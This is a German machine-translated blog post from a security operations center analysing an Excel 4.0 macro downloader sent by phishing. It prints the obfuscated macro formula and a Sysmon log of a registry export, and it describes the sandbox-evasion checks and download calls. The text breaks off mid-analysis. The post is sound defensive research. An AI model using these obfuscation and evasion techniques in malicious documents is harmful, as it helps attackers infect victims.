<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ‘©ğŸ¾â€âœˆï¸ ğŸ¤¾ ğŸ¤¸ğŸ» Alltag Tinkoff Security Operations Center: Analyse einzelner Bootloader â¤ï¸ ğŸ‘©ğŸ½â€ğŸ¨ ğŸ§“ğŸ½</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hallo Habr! 
 
 In unserem Tinkoff Security Operation Center analysieren wir regelmÃ¤ÃŸig die bei Malware und Angriffen verwendeten Techniken. KÃ¼rzlich ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Alltag Tinkoff Security Operations Center: Analyse einzelner Bootloader</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/tinkoff/blog/504430/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hallo Habr! </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In unserem Tinkoff Security Operation Center analysieren wir regelmÃ¤ÃŸig die bei Malware und Angriffen verwendeten Techniken. KÃ¼rzlich sind wir auf eine interessante Datei gestoÃŸen, Ã¼ber die wir sprechen mÃ¶chten.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wj/u9/yk/wju9ykf2tcl0k7ab3xohfmoilge.png" alt="Bild"><br>
<a name="habracut"></a> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Technik, mit der dieses Meisterwerk geschaffen wurde, ist seit Ã¼ber 20 Jahren bekannt, bleibt aber auch Jahrzehnte spÃ¤ter relevant, da die Aufrufe einiger ÃœberprÃ¼fungen im Makro nicht verdÃ¤chtig sind und in legitimen Dokumenten verwendet werden kÃ¶nnen. </font><font style="vertical-align: inherit;">Dies ist ein Malware-Downloader, der in Excel 4.0-Makros geschrieben wurde.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Werkzeuge</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Rahmen der Analyse werden wir mindestens Tools von Drittanbietern verwenden und mit einer Reihe von Standardprogrammen auskommen:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office Suite</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Archivar;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Texteditor;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Als Werkzeug zur Analyse von Softwareaktionen werden wir Sysmon verwenden.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Als Umgebung fÃ¼r die Analyse verwenden wir eine VM mit Windows 7 an Bord</font></font></li>
</ul><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mnogabukaf</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Dokument, das wir analysieren werden, ist eine Excel-Arbeitsmappe im XLS-Format. </font><font style="vertical-align: inherit;">Die Malware wird in Phishing-E-Mails Ã¼bermittelt. Wenn das Dokument gestartet wird, entlÃ¤dt das Makro den Registrierungszweig, lÃ¤dt Informationen zu Office-Updates von der Microsoft-Website herunter und lÃ¤dt schÃ¤dliche DLLs herunter und startet sie. </font><font style="vertical-align: inherit;">Nach diesen Schritten wird das Buch geschlossen, ohne Ã„nderungen zu speichern. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der Hauptunterschied zu anderen Ladern dieses Typs besteht darin, dass keine VBA-Makros verwendet werden.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Statische Analyse</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das folgende Beispiel zeigt eine E-Mail mit einem schÃ¤dlichen Dokument. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/pn/sf/hl/pnsfhllpvob_d_b7sop7ljyv7jq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ã–ffnen Sie den Anhang in unserer virtuellen Maschine. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie sollten sofort darauf achten: Das Bild warnt, dass das Dokument â€geschÃ¼tztâ€œ ist, und es lohnt sich, es lokal zu Ã¶ffnen und auf â€Inhalt aktivierenâ€œ zu klicken: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sg/mj/eu/sgmjeuardcvtcxqdvuf-wpk5ul0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eine Sicherheitswarnung weist darauf hin, dass Sie Projekte im Visual Basic-Editor anzeigen mÃ¼ssen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir wenden uns an das Entwickler-Makro-Management (vbs), sehen jedoch keine vbs- oder vba-Makros: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/te/jj/pn/tejjpn888lj2jfeoyj9snzxugos.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier ist die Zeit, sich daran zu erinnern, was Office-Dokumente sind. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jedes Microsoft Office-Dokument ist ein Archiv, das mit einem beliebigen Archivierer entpackt werden kann, um den Inhalt des Dokuments zu extrahieren:</font></font><br>
<br>
<img src="https://habrastorage.org/webt/kf/nj/hg/kfnjhgg1rmz7xffqsfm5w0plojk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach dem Auspacken sehen wir, dass es in den Dokumenten keine XML-Dateien gibt, an die wir gewÃ¶hnt sind. Das Ding hat das Ã¤ltere Dokumentformat - xls. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In der Erweiterung xls wird der Inhalt nicht im Office Open XML-Format, sondern im BIFF8-BinÃ¤rformat gespeichert. Das Dokument verwendet ein Excel 4.0-Makro, mit dem Makros in Dokumentzellen ausgefÃ¼hrt werden kÃ¶nnen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es ist anzumerken, dass das Blatt mit dem Makro nicht ausgeblendet ist, aber das Blatt eine groÃŸe Anzahl leerer Zellen aufweist, was die Analyse schwierig macht. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es gibt Tools zum Analysieren von BIFF8-Dateien, zum Beispiel BiffViewer, und zum Analysieren von Inhalten gibt es ein groÃŸartiges Tool - oletools. Wir werden jedoch versuchen, auf die Verwendung von Dienstprogrammen von Drittanbietern zu verzichten. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Excel hat auch ein </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XML-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> basiertes Format </font><font style="vertical-align: inherit;">- </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xlsm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kÃ¶nnen Sie VBA-Makrocode und Excel 4.0-MakroblÃ¤tter darin speichern, was wir tun werden. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die vollstÃ¤ndige Liste der fÃ¼r Excel verfÃ¼gbaren </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Formate enthÃ¤lt Excel-Formate</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir speichern unser Dokument, entpacken es: Mal </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/yg/yu/8b/ygyu8bzhfi2qwajfjmekp3i5_ek.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
sehen, was sich in den Dateien befindet, beginnen mit dem Makroblattverzeichnis im Ordner xl und suchen die Datei mit allen Daten auf dem Makroblatt: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/rt/9l/tw/rt9ltwvg6gyr0wipyuse7cootpe.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
So erhalten wir alle Werte in den Zellen auf dem Makroblatt. </font><font style="vertical-align: inherit;">Das Makro selbst ist verschleiert, die Zellen enthalten nur numerische Werte und Formeln, die diese Werte konvertieren und das Ergebnis in neue Zellen schreiben. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In dieser Formel werden beispielsweise numerische Werte in Zeichen konvertiert, verkettet und in die Zelle FK17653 geschrieben.</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Formel in Excel</font></font></b>
                        <div class="spoiler_text">FORMULA.FILL(CHAR(CV63675+HE4018)&amp;CHAR(DG27830+HE26544)&amp;CHAR(IA33205-EW25294)&amp;CHAR(X1216+BA26751)&amp;CHAR(X1216*ER27642)&amp;CHAR(EC50683*IA4491)&amp;CHAR(CV63675*CQ12674)&amp;CHAR(CV63675-IP35389)&amp;CHAR(DL61540+AP31398)&amp;CHAR(GB59870-IB5677)&amp;CHAR(X1216+DS45768)&amp;CHAR(GB59870+FV60781)&amp;CHAR(AA45534*S4000)&amp;CHAR(CV63675*FK10514)&amp;CHAR(EC50683/GD6905)&amp;CHAR(GB59870+EM58732)&amp;CHAR(HQ31358-GI51882)&amp;CHAR(X1216+FX24913)&amp;CHAR(DL61540*EC63501)&amp;CHAR(HQ31358-IC62223)&amp;CHAR(X1216*BY50777)&amp;CHAR(X1216*FY64649)&amp;CHAR(G64471+DW7092)&amp;CHAR(HQ31358-B26139)&amp;CHAR(HQ31358/I494)&amp;CHAR(G64471*DG37241)&amp;CHAR(DL61540-ES39934)&amp;CHAR(X1216+BX48975),FK17653)</div>
                    </div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Als Ergebnis der Formel erhalten wir die folgende Zeile: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/rq/ve/xn/rqvexng052dssxefthigngmj9nq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jeder nachfolgende Makrobefehl wird von einer Ã¤hnlichen Formel â€gesammeltâ€œ, in die Zelle geschrieben und dann ausgefÃ¼hrt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Damit das Makro beim Ã–ffnen des Dokuments automatisch ausgefÃ¼hrt wird, muss die Zelle, aus der das Skript gestartet werden soll, Auto_Open heiÃŸen. </font><font style="vertical-align: inherit;">Betrachten Sie die Datei workbook.xml:</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">workbook.xml</font></font></b>
                        <div class="spoiler_text">&lt;?xml version=Â«1.0Â» encoding=Â«UTF-8Â» standalone=Â«yesÂ»?&gt;<br>
&lt;workbook xmlns=Â«<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schemas.openxmlformats.org/spreadsheetml/2006/main</a>Â» xmlns:r=Â«<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schemas.openxmlformats.org/officeDocument/2006/relationships</a>Â» xmlns:mc=Â«<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schemas.openxmlformats.org/markup-compatibility/2006</a>Â» mc:Ignorable=Â«x15Â» xmlns:x15=Â«<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schemas.microsoft.com/office/spreadsheetml/2010/11/main</a>Â»&gt; appName=Â«xlÂ» lastEdited=Â«6Â» lowestEdited=Â«6Â» rupBuild=Â«14420Â»/&gt;&lt;workbookPr/&gt;&lt;mc:AlternateContent xmlns:mc=Â«<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schemas.openxmlformats.org/markup-compatibility/2006</a>Â»&gt; Requires=Â«x15Â»&gt;&lt;x15ac:absPath url=Â«C:\Users\User\Desktop\malware\Â» xmlns:x15ac=Â«<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">schemas.microsoft.com/office/spreadsheetml/2010/11/ac</a>Â»/&gt;&lt;/mc:Choice&gt;&lt;/mc:AlternateContent&gt;/&gt;&lt;sheet name=Â«Sheet1Â» sheetId=Â«1Â» r:id=Â«rId1Â»/&gt;&lt;sheet name=Â«Sheet2Â» sheetId=Â«2Â» r:id=Â«rId2Â»/&gt;Sheet2!$IE$65406/&gt;/&gt;/&gt;</div>
                    </div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In der Datei finden wir den Zeilennamen = "_ xlnm.Auto_OpenT8nee" hidden = "1"&gt; Sheet2! $ IE $ 65406 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dies bedeutet, dass die Zelle, in der das Makro ausgefÃ¼hrt wird, IE65406, ausgeblendet ist. </font><font style="vertical-align: inherit;">Jetzt kennen wir den Einstiegspunkt in das Makro.</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dynamische Analyse</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
FÃ¼hren Sie niemals verdÃ¤chtige Dateien auf Ihrem Computer aus. </font><font style="vertical-align: inherit;">Um die Aktionen verdÃ¤chtiger Software zu untersuchen, muss eine speziell vorbereitete Umgebung verwendet werden: verschiedene SandkÃ¤sten oder eine speziell vorbereitete isolierte Maschine - virtuell oder eisern. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ã–ffnen Sie das Dokument und fÃ¼hren Sie den Inhalt aus. </font><font style="vertical-align: inherit;">Das Eingabeaufforderungsfenster blinkt und das Buch wird geschlossen. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sehen wir uns die Sysmon-Protokolle an. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon hat ein Ereignis zur Prozesserstellung (ID 1). Weitere Informationen zu Sysmon finden Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
An den Protokollen sehen wir, dass das Makro Dateien im Verzeichnis c: \ users \ public erstellt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die folgende Sysmon-Nachricht zeigt an, dass der Registrierungszweig entladen und das Ergebnis in die Datei geschrieben wird:</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sysmon Event Ereignis ID 1</font></font></b>
                        <div class="spoiler_text">sysmon event id 1 <br>
Process Create:<br>
RuleName: technique_id=T1112,technique_name=Modify Registry<br>
ProcessGuid: {2a62482c-b244-5ecf-3a00-000000002700}<br>
ProcessId: 3268<br>
Image: C:\Windows\System32\reg.exe<br>
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)<br>
Description: Registry Console Tool<br>
Product: Microsoft Windows Operating System<br>
Company: Microsoft Corporation<br>
OriginalFileName: reg.exe<br>
CommandLine: Â«C:\Windows\system32\reg.exeÂ» EXPORT HKCU\Software\Microsoft\Office\16.0\Excel\Security C:\Users\Public\IcItdXw.reg /y"<br>
CurrentDirectory: C:\Users\user\Documents\<br>
User: user<br>
LogonGuid: {2a62482c-b1d8-5ecf-3284-010000000000}<br>
LogonId: 0x18432<br>
TerminalSessionId: 1<br>
IntegrityLevel: High<br>
Hashes: SHA1=8BD131B03D6BA865B228CA8EE3239D2EF2B90B74,MD5=D69A9ABBB0D795F21995C2F48C1EB560,SHA256=36414C7E57AFA6136D77FD47F4C55102E35F2475FBCD719728DA7D14B1590E2A,IMPHASH=BC564726CFF18A49EBC14784593A51CA<br>
ParentProcessGuid: {2a62482c-b23f-5ecf-3900-000000002700}<br>
ParentProcessId: 3164<br>
ParentImage: C:\Program Files\Microsoft Office\Office16\EXCEL.EXE<br>
ParentCommandLine: Â«C:\Program Files\Microsoft Office\Office16\EXCEL.EXEÂ»</div>
                    </div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach Abschluss lÃ¶scht das Makro die erstellten Dateien. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um das LÃ¶schen von Dateien zu verhindern, Ã¤ndern Sie die Berechtigungen fÃ¼r den Ordner, lassen Sie Lese- und Schreibberechtigungen und verbieten Sie das LÃ¶schen: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/lf/1a/go/lf1agokzzhrg21juvd4ptxlv1os.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
FÃ¼hren Sie das Dokument erneut aus. WÃ¤hrend der AusfÃ¼hrung des Makros wird eine Fehlermeldung angezeigt, mit der wir es debuggen kÃ¶nnen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dies ist mÃ¶glich, da bei einigen Aufrufen keine Ausnahmebehandlung erfolgt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0t/ul/u-/0tulu-lqdvaiqqwvif3qgy7syjg.png"><br>
 <br>
<img src="https://habrastorage.org/webt/rf/jo/em/rfjoem_yjobjgq4qnakt80zglke.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lassen Sie uns das Makro Schritt fÃ¼r Schritt </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">ausfÃ¼hren</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">WÃ¤hrend des Debuggens treten Funktionsaufrufe aus DLL-Bibliotheken wie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ShellExecute</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> und </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URLDownloadToFile auf</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Nach Abschluss des Makros befinden sich die folgenden Dateien im Ordner fÃ¼r freigegebene Benutzer:</font></font><br>
 <br>
<img src="https://habrastorage.org/webt/dc/aw/bd/dcawbdyabmgyj-qzjxcrvzqhpqi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Da wir die Zelle kennen, von der aus die AusfÃ¼hrung beginnt, kÃ¶nnen wir alle Zellen im Makroblatt ausfÃ¼llen. </font><font style="vertical-align: inherit;">Gehen wir Ã¼ber das Makro zur Funktion close (false), wo wir die AusfÃ¼hrung durch Klicken auf die SchaltflÃ¤che â€Pauseâ€œ unterbrechen.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UmgebungsprÃ¼fzellen</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn wir uns die Zellen ansehen, die das Makro fÃ¼llt, stoÃŸen wir auf verschiedene Funktionen: get.window () und get.workspace ()</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die Funktion get.window () gibt Informationen zum aktuellen Fenster zurÃ¼ck: Status, Fensterstatus, Name, Anzeigeoptionen usw.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mit der Funktion get.workspace () kÃ¶nnen Sie Informationen Ã¼ber die Umgebung abrufen, in der das Dokument ausgefÃ¼hrt wird.</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eine vollstÃ¤ndige Liste der fÃ¼r Excel 4.0 verfÃ¼gbaren Anrufe finden Sie unter den Links. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier mÃ¼ssen wir nÃ¤her darauf eingehen: Mein Kollege und ich schlugen vor, dass die meisten dieser Anrufe mit Versuchen zusammenhÃ¤ngen, SandkÃ¤sten zu umgehen:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">get.winow (7) - prÃ¼ft, ob das aktuelle Fenster ausgeblendet ist. </font><font style="vertical-align: inherit;">Gibt true oder false zurÃ¼ck.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">get.windows (20) - gibt true zurÃ¼ck, wenn das Fenster maximiert ist.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">get.windows (23) - kann die Werte 1, 2 und 3 zurÃ¼ckgeben.</font></font></li>
</ul><br>
<img src="https://habrastorage.org/getpro/habr/post_images/d54/afe/028/d54afe0281d24b5e34040af0122cd3d7.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
1 - wiederhergestellt </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2 - minimiert </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
3 - maximiert </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
So wird geprÃ¼ft, ob das aktuelle Fenster geÃ¶ffnet ist: </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
get.workspace (31) - prÃ¼ft, ob das Makro schrittweise debuggt wird. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
get.workspace (13) - ÃœberprÃ¼fen Sie die Breite des Arbeitsbereichs in Pixel: Wenn weniger als 770, schlieÃŸt das Buch </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/dh/zz/w3/dhzzw3m9vx-krc6nxgje-ken6x4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
get.workspace (14) - ÃœberprÃ¼fen Sie die HÃ¶he des Arbeitsbereichs in Pixel: Wenn weniger als 390, schlieÃŸt das Buch </font></font><br>
<br>
<img src="https://habrastorage.org/webt/4b/m5/8l/4bm58lswcaq-yi9xfjjinjc9ng0.png"> <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
get.workspace (19) - ÃœberprÃ¼fen Sie die Anwesenheit einer Maus. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
get.workspace (1) - Gibt zurÃ¼ck, auf welchem â€‹â€‹Betriebssystem das Dokument ausgefÃ¼hrt wird. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Falle von false erfolgt bei jeder PrÃ¼fung ein Ãœbergang zur BuchschlieÃŸzelle, ohne dass das Ergebnis gespeichert wird.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Externe Bibliotheksaufrufe</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem wir die Umgebung Ã¼berprÃ¼ft haben, fahren wir mit der HauptfunktionalitÃ¤t fort. Mal sehen, wie WinAPI-Funktionen vom Makro aufgerufen werden: </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
1. Der Aufruf von reg.exe, den wir in den Sysmon-Protokollen gesehen haben. </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/gy/vz/lv/gyvzlv4tfc9o4q0pmkplr9ea3eq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zum Aufrufen des Dienstprogramms wird die ShellExecute-Funktion aus der Bibliothek shell32.dll verwendet. Die Parameter fÃ¼r die Funktion sind in anderen Zellen verteilt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zelle BN16631: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/ug/af/vn/ugafvnkenyfwp2iv2mqvml0kfl8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zelle A46097: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/qa/wy/f7/qawyf7w4clfqocrpp4ixokeyzyc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In Zelle GN47559 wird der Befehl zum Exportieren des erforderlichen Registrierungszweigs gesendet. Get.workspace (2) gibt die Version von Excel zurÃ¼ck. </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/s7/_g/w5/s7_gw5jjgmgw32b9vxugtqxnxkw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Zelle DX48821 enthÃ¤lt den Pfad, in den das Ergebnis geschrieben wird. </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/wt/i9/-m/wti9-myhidza4-8nm7xd_s3rkmg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Weiter im Makro wird geprÃ¼ft, ob die erstellte IcltdXw.reg-Datei vorhanden ist und gelÃ¶scht wurde. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2. Aufrufen der Funktion URLDownloadToFile. Diese Funktion speichert das Ergebnis einer Abrufanforderung in einer Datei. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der Anruf lautet wie folgt:</font></font><br>
<br>
<img src="https://habrastorage.org/webt/bu/vn/ye/buvnyevcolwz4oofwcxygw1zbam.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Aufruf fÃ¼hrt uns zur Microsoft-Website und zur Seite mit Informationen zu Office-Updates. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Funktionsparameter: </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zelle BR6547 </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/yc/s9/ws/ycs9wsggtysuw-zxwt_o0dt4r94.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zelle IN49847 </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/i2/an/lg/i2anlg2ev8fwcc40tb-z9f2mzmi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach dem AusfÃ¼hren der Anweisung wird geprÃ¼ft, ob die Datei erstellt wurde, und auch das Lesen des Zeichens durch den Versatz in der Datei: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/ei/by/lc/eibylc7t9nfpt1o9fpqqri2myzm.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
